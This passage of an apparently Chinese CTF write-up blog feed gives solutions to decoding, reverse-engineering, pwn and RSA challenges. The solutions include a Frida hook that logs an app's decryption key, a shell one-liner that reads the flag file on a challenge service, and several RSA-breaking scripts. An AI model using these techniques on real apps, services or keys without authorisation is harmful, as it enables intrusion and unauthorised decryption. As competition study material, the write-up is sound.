1SWFZucEJlRlZYYzNoV01XUlpZVVpvYVZJeFNtaFdiWEJEVmpBMVIxZHNhRTlXYXpWWFZGZDBkMlZXVW5OWGJrNVlZbFZXTkZrd1pHOVdNREZIWTBod1YySkdjRkJaZWtaUFkyczFWMVJ0YkZOaVdGRXhWbTE0YW1WRk1VWk5WV2hUWW10d1QxWnRNVFJWTVd4VlZHdE9XRkp0ZUhwWlZXTTFWakZLZEdWR2FGZE5ibEYzV1ZkemVHTnJOVlpoUm5Cb1RWaENNbFp0Y0VKa01sWkhWRzVHVkdKSFVsaFphMVozVWtaYVIxZHRkRlZpVmxwSVdUQldjMVpIU2xoaFJsSlZWa1Z3ZGxac1dtRlNNVnAwVW0xMFRtRXhjRWxXYWtreFZURlNjMVJyYUdoU2JWSldWbTE0WVdWc1VuSlhiVVpZVWxSV1YxUXhXbTlWTURGSlVXeG9WMkZyYnpCWlZFWmhaRVpPYzJKSGFGTlNWRlpYVm0xNFlXUXlSa2RYV0dSWFZrVmFXRmxyV2t0bGJHUnlWbFJHYUZKVVFqTlZNblF3VmpBeFYyTkdhRmRoYTFwWFdsVmFhMk15UmtkVmJXaE9Za1Z3TkZac1pIZFRNa2w0VjFob1ZtSkdjR2hWYlhNeFYxWldkR1ZHWkU1TlZtdzFXa1ZTUTJGRk1WWmlSRTVWWWtaYWNsWnNaRXRTTWs1SlUyeGtVMDB5YUc5V2FrSnJWVzFXZEZSclpHRlNNbmhaVldwS2IxWnNXbk5oU0dSU1lsWmFTRlpIZEd0V1YwcElaVWhDVm1KWVRYaFpha1pUVjBkV1JtUkdaR2xTTVVwYVZrWmFiMlF4VW5OWGJrNXFVbTFvWVZsVVNtOVZSbHB4VTJ0MFYySkhVbnBaVlZwM1lVVXhXVkZZY0ZkU2JGcG9Xa1JHWVdSR1NuSmhSM1JUWWtad2RsZHNaREJaVm1SeldraE9WMkpWV205VVZscHpUVEZTVjJGRlpGZE5hM0I1V1RCYWIxWXlSWGhYYWs1WFVsWndWMXBWV210amJIQklZMGRzVkZKVmNFcFdiVEI0WldzeFYxZFliRlJoTWxKWVdWZDRTMWRHVWxkWGJtUm9VbTFTV0ZZeWN6RmlSa3AxVVd0b1dHRXhjRkJaVm1SR1pVZE9SMk5HYUZkTk1VcDVWMWR3UjJFeFNYbFRhMnhVWWtkb2NGbHNXa3RsYkZwMFRVaG9WazFYVW5wWlZFNXJWakpLV1ZWc2FGVldNMUl6VmpCYVYyUkhUa1pQVm1SWFlraENObGRVUW05VE1WbDNUVlZvVm1FemFGaFVWV1JUVjBaVmVGZHNUbXBOYXpWSVYydGFUMVl5U2xWaGVrcFhZbFJHTTFWcVJuTlhSa3BaWVVkR1UxWXlhRmxYVmxKTFlqRldWMWR1VW10VFIxSldWRlphZDAxR2NFWmhSM1JYVW14d2Vsa3dhSGRYUjBWNFUyeFNWMDF1YUdoYVJXUlhVakpHUjFkck5XbGlWMmcxVmpGYWEwNUdVWGhUYmtwUFZtMVNhRlZ0TlVOalJsWjBaRWhrVkZac2NEQmFSV1JIVjBkS1YxZHNiRmRpV0ZKNlZteGtTMWRXUm5WUmJGcG9ZVEZ3VFZaSE1UUlpWMDV6WVROd2FGSXllRTlXYlhoYVRVWmFjVk5xUWxwV2JWSkpWVzAxVDJGc1NuUmhSbWhhVmtWYWFGcFdXbmRXYkdSMVZHMXdWMkV6UWpaWFZFSnJUa1pWZVZOc1pGUmlWVnBaVm10V1MyTnNiSEZTYkZwclRVUkdXbFpYTVc5Vk1sWjBaVVpzVjJKWVFsQldWRVpyVWpGd1IxcEdhR2xoZWxaWlZrWmtlazFXVGtkWFdHeHNVbnBzYjFadE1WTlRSbFY1VGxoT1YwMXJjRlpWYkZKRFYwWmFjMVpxVWxaaGEzQlFWV3BHYTJNeVJraGhSM2hwVjBkb2FGWnRlR3BsUlRGSVZWaHNWMkpIVW05VVZFcFRWMVpzZEUxV1RsaFNiRXBaV2tWYWExUXhTblJrUkU1WVlUSk5NVll3V2t0ak1rNUpZMFp3VGxJeVozcFdiWEJMVWpKT2MxcElUbFppU0VKUFdXMHhibVZzV2xoalJXUnJUVlUxU1ZVeWRHOWhSa2w2WVVoQ1ZtSlVWa1JYVmxwaFpFZE9SbHBIYUdsV2JIQktWbTB3TVZNeFVuTlhibEpXWWtkNFdGUlZaRk5rYkZsNFYyNU9hMUl4V2tkYVJXUjNWR3hhYzJORVVsZFdiVTQwVldwR2ExSXhUblZWYlhoVVVqTm9XVlpHWXpGVmJWRjRWMjVHVWxkSGFGaFVWM014VTBac2NsZHNaR2hXYTNCNldXdFNUMVl5U2xWU1ZFSllWbTFTVDFwVlduZFRWbEp6WVVkc1UySklRbHBXYlRCNFRVZFJkMDVXWkZoaVJuQlpXVlJHZDFWV1duUmtSWFJXVFZaYVNGWldhR3RWVmxaVlRVUnJQUT09\n</code></pre>\n<p>解 base64</p>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/13.png\" alt=\"img\"></p>\n<p>atbash_cipher 和 string_reverserever</p>\n<pre><code class=\"language-Bash\">ntio&#123;lmi8i56k1lkn73im7ni75k52in41jj70&#125;\n</code></pre>\n<p>Caesar 8</p>\n<pre><code class=\"language-Bash\">flag&#123;dea8a56c1dcf73ae7fa75c52af41bb70&#125;\n</code></pre>\n<h2 id=\"reverse\"><a class=\"markdownIt-Anchor\" href=\"#reverse\">#</a> Reverse</h2>\n<h3 id=\"babyre\"><a class=\"markdownIt-Anchor\" href=\"#babyre\">#</a> BabyRe</h3>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/14.png\" alt=\"img\"></p>\n<p>赛博厨子嗦哈</p>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/15.png\" alt=\"img\"></p>\n<h3 id=\"tea\"><a class=\"markdownIt-Anchor\" href=\"#tea\">#</a> TEA</h3>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/16.png\" alt=\"img\"></p>\n<p>不知道啥情况，打开就是 flag，试了，还真是</p>\n<h3 id=\"easyre\"><a class=\"markdownIt-Anchor\" href=\"#easyre\">#</a> EasyRe</h3>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/17.png\" alt=\"img\"></p>\n<p>自带解密函数</p>\n<pre><code class=\"language-JavaScript\">Java.perform(function () &#123;\n\n   var aESUtils =Java.use(&quot;com.example.easyre.AESUtils&quot;);\n    aESUtils.decrypt.implementation=function (a,b)&#123;\n\n\n       console.log(&quot;miwen:&quot;,a);\n       console.log(&quot;key&quot;, b);\n\n       var srcret = this.decrypt(a,b);\n       console.log(&quot;加密后:&quot;,srcret);\n       return srcret;\n&#125;\n\n&#125;);\n</code></pre>\n<p>hook 出来然后直接看密文</p>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/18.png\" alt=\"img\"></p>\n<p>base64 解密</p>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/19.png\" alt=\"img\"></p>\n<h3 id=\"gorc\"><a class=\"markdownIt-Anchor\" href=\"#gorc\">#</a> GORC</h3>\n<p>动调出 key</p>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/20.png\" alt=\"img\"></p>\n<p>直接解密</p>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/21.png\" alt=\"img\"></p>\n",
            "tags": [
                "wp"
            ]
        },
        {
            "id": "http://example.com/2023/10/24/FSCTF-wp/",
            "url": "http://example.com/2023/10/24/FSCTF-wp/",
            "title": "FSCTF_wp",
            "date_published": "2023-10-24T01:31:05.000Z",
            "content_html": "<h1 id=\"fsctf\"><a class=\"markdownIt-Anchor\" href=\"#fsctf\">#</a> FSCTF</h1>\n<p>RAND:12</p>\n<p><img data-src=\"/img/fsctfwppic/1.png\" alt=\"image-20231024075145656\"></p>\n<h2 id=\"web\"><a class=\"markdownIt-Anchor\" href=\"#web\">#</a> web</h2>\n<h3 id=\"源码启动\"><a class=\"markdownIt-Anchor\" href=\"#源码启动\">#</a> 源码！启动！</h3>\n<p>CTRL+U 查看源码</p>\n<h2 id=\"pwn\"><a class=\"markdownIt-Anchor\" href=\"#pwn\">#</a> pwn</h2>\n<h3 id=\"nc\"><a class=\"markdownIt-Anchor\" href=\"#nc\">#</a> nc</h3>\n<pre><code>tac fl* &gt;&amp;2\n</code></pre>\n<h2 id=\"re\"><a class=\"markdownIt-Anchor\" href=\"#re\">#</a> re</h2>\n<h3 id=\"xor\"><a class=\"markdownIt-Anchor\" href=\"#xor\">#</a> Xor</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>b <span class=\"token operator\">=</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"t~suiFz&#123;aM&#123;aMsMwsakM`wdw`awo\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    b<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token number\">0x12</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"crypto\"><a class=\"markdownIt-Anchor\" href=\"#crypto\">#</a> crypto</h2>\n<h3 id=\"rsa-1\"><a class=\"markdownIt-Anchor\" href=\"#rsa-1\">#</a> RSA 1</h3>\n<pre><code>p=1458769258361\nq=4556983871563\ne=17\n求d\n</code></pre>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>phi <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>d <span class=\"token operator\">=</span> gmpy2<span class=\"token punctuation\">.</span>invert<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span>phi<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"做不出来就别阴阳怪气啦\"><a class=\"markdownIt-Anchor\" href=\"#做不出来就别阴阳怪气啦\">#</a> 做不出来就别阴阳怪气啦</h3>\n<pre><code>就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ \n</code></pre>\n<blockquote>\n<p>阴阳怪气解密</p>\n</blockquote>\n<pre><code>FSCTF&#123;Jiuzhe@JustSoSo&#125;\n</code></pre>\n<h3 id=\"rsa-2\"><a class=\"markdownIt-Anchor\" href=\"#rsa-2\">#</a> RSA 2</h3>\n<pre><code>c=90362297576572826064831133206230135349790392078780406000643496612200873754835039374184323808342127071833274981191134125413478105835272238356352724573228797863805124195170088819735610736936895478614898105848968069280022022112207095140266709372221090586917729998024205978412679448008696923580889787529663283314\np=8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229 \nq=11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407\ne=65537\n</code></pre>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> libnum</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>phi <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>d <span class=\"token operator\">=</span> gmpy2<span class=\"token punctuation\">.</span>invert<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span>phi<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>m <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"rsa3\"><a class=\"markdownIt-Anchor\" href=\"#rsa3\">#</a> RSA3</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> bytes_to_long</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>m<span class=\"token operator\">=</span>bytes_to_long<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>n<span class=\"token operator\">=</span> <span class=\"token number\">12308543373374311860115195114269947739026255098864232126071500623399852788903738569949462616714391748269539072128882946132686996592089735285396762634029371785959865779256901123369306119124563405765293657606975290441243965513640680841871955014230301486214824204887945375140818283280272607903500556306646445508386218951500563603482945071727344737690804338144982687000734071274618240408238519378280819162796749148066754028700125846348589164721591354555019608871411236973606149388257533629388508942271702742078883636357856776193846813894734271905070538713351614750057245897158615891962167410053552739441195871000310777649</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>e<span class=\"token operator\">=</span> <span class=\"token number\">65537</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>dp<span class=\"token operator\">=</span> <span class=\"token number\">28196759050232165736649945458463681080421101473761579424309687746007021074159564720195299959516638110870101025657932732247788828322476803386736345945717104030991724584628153257976163663460034720811420324255626233108130037584679035250792445830510130682783638394418531763109219293027733347554816808577799709553</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>c<span class=\"token operator\">=</span> <span class=\"token number\">1855798257044238280327042455832785889763141234883180404158555071443088630113034033050409259513632343742665544043437830959750873431928980910236398026670945184328950692568113819821699696418438157336263799808404698795433243968536256780396910914692949484556950491722527661706255009863481905590371725089587377065000354109396062360440021447607401687082247775453369117424848927386857425051097931983703966253652921113920387008048024308793686643944404541941182997963873579988680965558581885273185721576668001462817150245955628293258512024323515581063235248627223179117549540541642185815489978089367061102920114395871329023208</span></pre></td></tr></table></figure><blockquote>\n<p>dp 泄露</p>\n</blockquote>\n<p><img data-src=\"/img/fsctfwppic/2.png\" alt=\"image-20231024081420584\"></p>\n<h3 id=\"big_e\"><a class=\"markdownIt-Anchor\" href=\"#big_e\">#</a> Big_e</h3>\n<pre><code>n = 12238605063252292170613110607692779326628090745751955692266649177882959231822580682548279800443278979485092243645806337103841086023159482786712759291169541633901936290854044069486201989034158882661270017305064348254800318759062921744741432214818915527537124001063995865927527037625277330117588414586505635959411443039463168463608235165929831344586283875119363703480280602514451713723663297066810128769907278246434745483846869482536367912810637275405943566734099622063142293421936734750356828712268385319217225803602442033960930413469179550331907541244416573641309943913383658451409219852933526106735587605884499707827\ne=  11850552481503020257392808424743510851763548184936536180317707155841959788151862976445957810691568475609821000653594584717037528429828330763571556164988619635320288125983463358648887090031957900011546300841211712664477474767941406651977784177969001025954167441377912326806132232375497798238928464025466905201977180541053129691501120197010080001677260814313906843670652972019631997467352264392296894192998971542816081534808106792758008676039929763345402657578681818891775091140555977382868531202964486261123748663752490909455324860302967636149379567988941803701512680099398021640317868259975961261408500449965277690517\nc=4218884541887711839568615416673923480889604461874475071333225389075770098726337046768413570546617180777109293884545400260353306419150066928226964662256930702466709992997796154415790565112167663547017839870351167884417142819504498662037048412313768450136617389372395690363188005647619061128497371121168347810294424378348301835826084732747005110258557662466626720961279087145559906371505117097599774430970980355531235913439823966628008554872896820907555353892843539526041019103819804854883231421963308265517622470779089941078841902464033685762524196275032288319744157255628189204988632871276637699312750636348750883054\n\n\n请解出明文！！！\n</code></pre>\n<blockquote>\n<p>维纳攻击</p>\n</blockquote>\n<p><img data-src=\"/img/fsctfwppic/3.png\" alt=\"image-20231024081609249\"></p>\n<h3 id=\"do-you-know-gcd\"><a class=\"markdownIt-Anchor\" href=\"#do-you-know-gcd\">#</a> Do you know gcd</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> secret <span class=\"token keyword\">import</span> flag</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>m1<span class=\"token operator\">=</span>bytes_to_long<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>m2<span class=\"token operator\">=</span>bytes_to_long<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p<span class=\"token operator\">=</span>getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>q1<span class=\"token operator\">=</span>getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>q2<span class=\"token operator\">=</span>getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>n1<span class=\"token operator\">=</span>p<span class=\"token operator\">*</span>q1</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>n2<span class=\"token operator\">=</span>p<span class=\"token operator\">*</span>q2</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>e<span class=\"token operator\">=</span><span class=\"token number\">65537</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>c1<span class=\"token operator\">=</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m1<span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span>n1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>c2<span class=\"token operator\">=</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m2<span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span>n2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"n1=\"</span><span class=\"token punctuation\">,</span>n1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"n2=\"</span><span class=\"token punctuation\">,</span>n2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"c1=\"</span><span class=\"token punctuation\">,</span>c1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"c2=\"</span><span class=\"token punctuation\">,</span>c2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>n1= 18680935400842120133090782991548100098299141114788036098274292600814484762178879421175852824971602717084073867867453382415307589970440719890918576225495401632854107018246844209327118177917122236073227158593514362850629722223228335334773008682775987859295083444638923726449899310854161394586430943134469559429878238769266114132469166535509030877235272476877484918308883799496627699789051809542538091061550107526246728583019140703765888157806778516567048103700384849598143249322109207879381251223776896702362630437178664824125387477797876186939235800859102380783259361745143574493440078787931593394188675093506492640857</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>n2= 16308523133405725830120564525574438512803584148781960516042054284309437381876822602134185065101371986717984978566359252072738078020261823966208153922611063201149105749778596739692554295573408850719208215646167050188830459343054219856901871953140988948482577813730729085764541988120049026971705499798003225755018687242522370406495429425494022876627543617474873929054728724093702291448754458748923218635900061398716191201846139296921753782690468189409101899415028480878296408735247604084627019116374444335509072590669239349212479592499426230525792270750612371117196200786891891430446212938482959351978202358044864822577</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>c1= 534518909595318304521410713148076850830155521838755402438490325620155197496935820831936109252194297244161393310730073882257949954815312409974998733265641354273665213856408848764503848122264972023143474923678585167025591255034150826271791019266426616987355463111138963331008761826310757292765842789380409826387579098421126952331558360737102888876551724241978020305977032047901621477384392409864427091911872691182528938458750707982564581322551517287491916691010743390992018974168703956622998928457142606354825714033609199676987795174032254878017883605565760275857658822315970522114838062469258676628619381342357632179</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>c2= 10248394002302905069278122013496854496130190499518622376819239887579692634750808499513497018453473232140518824608976734237637842228035017757831938865937098325684711995382081489403971465596662585196007547659143066184546400992333479193424580690897692586491475768279754939199148642035267049092880715299621206567123356521609120801306358100326600900326310677054810032471472266402660807205675696110133573150125117412696328434523507708110949743705536889950671778501402435457354251761692098671783596194430798692942013503015764266392551048702428063161786512924608239609802040937400619384828550050291094616346317726139970219621</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>'''</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>n1<span class=\"token operator\">=</span> <span class=\"token number\">18680935400842120133090782991548100098299141114788036098274292600814484762178879421175852824971602717084073867867453382415307589970440719890918576225495401632854107018246844209327118177917122236073227158593514362850629722223228335334773008682775987859295083444638923726449899310854161394586430943134469559429878238769266114132469166535509030877235272476877484918308883799496627699789051809542538091061550107526246728583019140703765888157806778516567048103700384849598143249322109207879381251223776896702362630437178664824125387477797876186939235800859102380783259361745143574493440078787931593394188675093506492640857</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>n2<span class=\"token operator\">=</span> <span class=\"token number\">16308523133405725830120564525574438512803584148781960516042054284309437381876822602134185065101371986717984978566359252072738078020261823966208153922611063201149105749778596739692554295573408850719208215646167050188830459343054219856901871953140988948482577813730729085764541988120049026971705499798003225755018687242522370406495429425494022876627543617474873929054728724093702291448754458748923218635900061398716191201846139296921753782690468189409101899415028480878296408735247604084627019116374444335509072590669239349212479592499426230525792270750612371117196200786891891430446212938482959351978202358044864822577</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>c1<span class=\"token operator\">=</span> <span class=\"token number\">534518909595318304521410713148076850830155521838755402438490325620155197496935820831936109252194297244161393310730073882257949954815312409974998733265641354273665213856408848764503848122264972023143474923678585167025591255034150826271791019266426616987355463111138963331008761826310757292765842789380409826387579098421126952331558360737102888876551724241978020305977032047901621477384392409864427091911872691182528938458750707982564581322551517287491916691010743390992018974168703956622998928457142606354825714033609199676987795174032254878017883605565760275857658822315970522114838062469258676628619381342357632179</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>c2<span class=\"token operator\">=</span> <span class=\"token number\">10248394002302905069278122013496854496130190499518622376819239887579692634750808499513497018453473232140518824608976734237637842228035017757831938865937098325684711995382081489403971465596662585196007547659143066184546400992333479193424580690897692586491475768279754939199148642035267049092880715299621206567123356521609120801306358100326600900326310677054810032471472266402660807205675696110133573150125117412696328434523507708110949743705536889950671778501402435457354251761692098671783596194430798692942013503015764266392551048702428063161786512924608239609802040937400619384828550050291094616346317726139970219621</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>e<span class=\"token operator\">=</span><span class=\"token number\">65537</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p <span class=\"token operator\">=</span> gcd<span class=\"token punctuation\">(</span>n1<span class=\"token punctuation\">,</span>n2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>q1 <span class=\"token operator\">=</span> n1<span class=\"token operator\">//</span>p</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>q2 <span class=\"token operator\">=</span> n2<span class=\"token 